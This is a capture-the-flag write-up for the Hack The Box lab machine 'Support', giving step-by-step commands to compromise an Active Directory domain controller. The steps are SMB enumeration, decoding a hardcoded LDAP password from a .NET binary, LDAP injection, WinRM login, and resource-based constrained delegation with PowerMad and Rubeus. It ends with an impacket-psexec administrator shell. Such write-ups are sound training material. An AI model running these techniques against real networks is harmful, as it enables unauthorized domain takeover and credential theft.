---
icon: windows
---

# Support - Easy

<figure><img src="../../.gitbook/assets/image.png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/support"><strong>Support</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```shellscript
## Nmap TCP
nmap -A -T4 -p- -Pn 10.10.11.174 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-01 18:35 EST
Nmap scan report for dc.support.htb (10.10.11.174)
Host is up (0.038s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-01 23:37:22Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-12-01T23:38:19
|_  start_date: N/A
|_clock-skew: 3s

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   52.87 ms 10.10.16.1
2   52.85 ms dc.support.htb (10.10.11.174)
```

nmap scan reveals the domain support.htb. I'll add it to my hosts file

```shellscript
10.10.11.174	support.htb
```

### <mark style="color:$primary;">SMB Enumeration</mark>

```shellscript
netexec smb support.htb -u guest -p '' --shares
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

smb reveals an interesting share we have read access to. Let's take a look at it&#x20;

```shellscript
smbclient \\\\support.htb\\support-tools -N
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Most of these are default support tools. The one that stands out is UserInfo.exe.zip. I'll download it to my machine and take a look at it

### <mark style="color:$primary;">UserInfo.exe</mark>

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

I'll unzip it into a folder and take a look at the .exe file

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

I'll transfer the zip file to a Windows Machine and play with it there.

```powershell
PS > .\UserInfo.exe

Usage: UserInfo.exe [options] [commands]

Options:
  -v|--verbose        Verbose output

Commands:
  find                Find a user
  user                Get information about a user
```

All the DLLs and the `.config` file must be in the same directory, otherwise it will erorr out

```powershell
PS > .\UserInfo.exe

Unhandled Exception: System.IO.FileNotFoundException: Could not load file or assembly 'CommandLineParser, Version=0.7.0.0, Culture=neutral, PublicKeyToken=null' or one of its dependencies. The system cannot find the file specified.
   at UserInfo.Program.Main(String[] args)
   at UserInfo.Program.<Main>(String[] args)
```

If I run either `find` or `user` with `-h`, it prints help for each

```powershell
PS > .\UserInfo.exe user -h

Usage: UserInfo.exe user [options]

Options:
  -username           Username
```

Either command hangs for a bit and then returns an error on running

```powershell
PS > .\UserInfo.exe user -username deimos
[-] Exception: The server is not operational.
```

I'll open up Wireshark and run the command again

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

It's looking for support.htb

I’ll update `C:\Windows\System32\drivers\etc\hosts`, and connect my VPN on this Windows host so I can talk to Support. Now it reports that it can’t find my username

```shellscript
10.10.11.174	dc.support.htb management.htb support.htb
```

```shellscript
PS > .\UserInfo.exe user -username deimos
[-] Unable to locate deimos. Please try the find command to get the user's username.
```

`find` requires either `-first` or `-last`

```powershell
PS > .\UserInfo.exe -v find
[-] At least one of -first or -last is required.
PS > .\UserInfo.exe find -first john
[-] No users identified with that query.
```

I can do some basic LDAP injection and get all users with a first name

```powershell
PS > .\UserInfo.exe find -first '*'
raven.clifton
anderson.damian
monroe.david
cromwell.gerard
west.laura
levine.leopoldo
langley.lucy
daughtler.mabel
bardot.mary
stoll.rachelle
thomas.raphael
smith.rosario
wilson.shelby
hernandez.stanley
ford.victoria
```

With a valid name, it prints info about the user that a support team might need

```powershell
PS > .\UserInfo.exe user -username smith.rosario
First Name:           rosario
Last Name:            smith
Contact:              smith.rosario@support.htb
Last Password Change: 5/28/2022 7:12:19 AM
```

### <mark style="color:$primary;">Recover LDAP Password</mark>

I’ll look at the binary to locate credentials. I’ll open `UserInfo.exe` in DNSpy

{% embed url="https://github.com/dnSpy/dnSpy" %}

#### <mark style="color:yellow;">How to explore an EXE with dnspy</mark>

1\) Run dnSpy.exe

2\) Click on File then Open

3\) Select the EXE file to open

4\) The selected assembly will be available in the Assembly explorer part

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

`LdapQuery` seems like a good place to start. There are two functions, `printUser` and `query`, which likely match up with the two commands. The constructor is most interesting

```c
		public LdapQuery()
		{
			string password = Protected.getPassword();
			this.entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
			this.entry.AuthenticationType = AuthenticationTypes.Secure;
			this.ds = new DirectorySearcher(this.entry);
		}
```

It’s loading a password, and then connecting to LDAP with the user `SUPPORT\ldap` and that password.

I need to look at the `Protected.getPassword()` function

```c
using System;
using System.Text;

namespace UserInfo.Services
{
	// Token: 0x02000006 RID: 6
	internal class Protected
	{
		// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318
		public static string getPassword()
		{
			byte[] array = Convert.FromBase64String(Protected.enc_password);
			byte[] array2 = array;
			for (int i = 0; i < array.Length; i++)
			{
				array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
			}
			return Encoding.Default.GetString(array2);
		}

		// Token: 0x04000005 RID: 5
		private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

		// Token: 0x04000006 RID: 6
		private static byte[] key = Encoding.ASCII.GetBytes("armando");
	}
}
```

found it. I’ll decrypt the password using a Python terminal

```shellscript
└─$ python
Python 3.13.2 (main, Feb  5 2025, 01:23:35) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from base64 import b64decode
>>> from itertools import cycle
>>> pass_b64 = b"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
>>> key = b"armando"
>>> enc = b64decode(pass_b64)
>>> [e^k^223 for e,k in zip(enc, cycle(key))]
[110, 118, 69, 102, 69, 75, 49, 54, 94, 49, 97, 77, 52, 36, 101, 55, 65, 99, 108, 85, 102, 56, 120, 36, 116, 82, 87, 120, 80, 87, 79, 49, 37, 108, 109, 122]
>>> bytearray([e^k^223 for e,k in zip(enc, cycle(key))]).decode()
'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

Another way we could have done this was by using wireshark. Run the binary and capture the authentication step int the LDAP stream

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

This can also be viewed in the packet that Wireshark labels as <mark style="color:$primary;">**bindRequest**</mark>

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```shellscript
netexec smb support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

These creds work. I will do bloodhound collection next and take a look.

### <mark style="color:$primary;">LDAP</mark>

{% code overflow="wrap" %}
```shellscript
ldapsearch -x -H ldap://10.10.11.174 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" > ldap.out
```
{% endcode %}

{% code overflow="wrap" %}
```shellscript
ldapsearch -x -H ldap://10.10.11.174 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" '(objectClass=person)' > ldap-people
```
{% endcode %}

Going through the LDAP dump I saw what looked like a password in the info field of the support user

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

```shellscript
netexec winrm support.htb -u support -p 'Ironside47pleasure40Watchful'
```

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Nice we have winrm access as the support user

```shellscript
evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
```

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Bloodhound</mark>

{% code overflow="wrap" %}
```shellscript
netexec ldap support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --bloodhound --collection All --dns-server 10.10.11.174
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:yellow;">Support User -> Group Delegated Object Control</mark>

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

support is a member of the <mark style="color:$primary;">Shared Support Accounts</mark> group that has <mark style="color:$primary;">GenericAll</mark> on the computer object <mark style="color:$primary;">DC.SUPPORT.HTB</mark>

### <mark style="color:$primary;">GenericAll on target Machine</mark>

I’ll need three scripts to complete this attack

* [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
* [PowerMad.ps1](https://github.com/Kevin-Robertson/Powermad)
* [Rubeus.exe](https://github.com/GhostPack/Rubeus)&#x20;

I’ll upload these and import the two PowerShell scripts into my session

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

Next I will need to know the administrator on DC

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

Bloodhound tells me it's administrator@support.htb

**I’ll verify that users can add machines to the domain**

{% code overflow="wrap" %}
```shellscript
Get-DomainObject -Identity 'DC=SUPPORT,DC=HTB' | select ms-ds-machineaccountquota
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

The quote is set to the default of 10, which is good.

I’ll also need to make sure there’s a 2012+ DC in the environment

```powershell
Get-DomainController | select name,osversion | fl
```

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

2022 Standard is great.

Finally, I’ll want to check that the `msds-allowedtoactonbehalfofotheridentity` is empty

{% code overflow="wrap" %}
```powershell
Get-DomainComputer DC | select name,msds-allowedtoactonbehalfofotheridentity | fl
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

It is!

#### <mark style="color:red;">Note!!!</mark>&#x20;

<mark style="color:red;">When completing the below steps if you do not do them in quick succession you will get an error related to Kerberos you have to restart the machine and redo the steps quicker!</mark>

#### <mark style="color:yellow;">Create Fake Computer</mark>

I’ll use the Powermad `New-MachineAccount` to create a fake computer

{% code overflow="wrap" %}
```powershell
New-MachineAccount -MachineAccount deimos -Password $(ConvertTo-SecureString 'Deimos123!' -AsPlainText -Force)
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

I need the SID of the computer object as well, so I’ll save it in a variable

```powershell
$fakesid = Get-DomainComputer deimos | select -expand objectsid
```

<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:yellow;">Attack</mark>

Now I’ll configure the DC to trust my fake computer to make authorization decisions on it’s behalf. These commands will create an ACL with the fake computer’s SID and assign that to the DC

```powershell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

Now to verify if it worked

```powershell
$RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
$Descriptor.DiscretionaryAcl
```

<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

There is an ACL with the `SecurityIdentifier` of my fake computer and it says `AccessAllowed`.

I can also re-run Bloodhound now:

{% code overflow="wrap" %}
```shellscript
netexec ldap support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --bloodhound --collection All --dns-server 10.10.11.174
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:yellow;">Auth as Fake Computer</mark>

I’ll use `Rubeus` to get the hash of my fake computer account

```powershell
.\Rubeus.exe hash /password:Deimos123! /user:deimos /domain:support.htb
```

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

I need the one labeled `rc4_hmac`, which I’ll pass to `Rubeus` to get a ticket for administrator

{% code overflow="wrap" %}
```powershell
.\Rubeus.exe s4u /user:deimos /rc4:94F8B40315E07347227E9EBFAC74B591 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

at the bottome you should see administrator's ticket

<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

In theory, I should be able to use this ticket right now. `Rubeus` shows the ticket in this session

```ps
.\Rubeus.exe klist
```

<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:yellow;">Remote use</mark>

I’ll grab the last ticket `Rubeus` generated, and copy it back to my machine, saving it as `ticket.kirbi.b64`, making sure to remove all spaces. I’ll base64 decode it into `ticket.kirbi`:

Remove the white spaces in vi with the command

```
:%s/\s\+//g
```

then

```shellscript
base64 -d ticket.kirbi.b64 > ticket.kirbi
```

Now I need to convert it to a format that Impact can use:

```shellscript
impacket-ticketConverter ticket.kirbi ticket.ccache
```

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

I can use this to get a shell using `psexec.py`

{% code overflow="wrap" %}
```shellscript
KRB5CCNAME=ticket.ccache impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>
